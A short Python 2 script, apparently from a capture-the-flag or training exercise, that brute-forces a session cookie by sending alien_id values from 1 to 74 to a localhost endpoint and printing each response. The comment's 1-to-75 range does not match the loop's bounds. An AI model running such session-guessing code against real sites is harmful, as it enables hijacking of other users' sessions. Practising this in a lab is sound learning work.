# A script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
#
# The cookie id the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout

import urllib2

for i in range(1,75):

  # Specifies URL and opens it
  request = urllib2.Request("http://127.0.0.1:8082/cookiestore", headers={"Cookie":"alien_id="+str(i)})
  response = urllib2.urlopen(request)

  # Reads the response and prints to console
  html = response.read()
  print(html)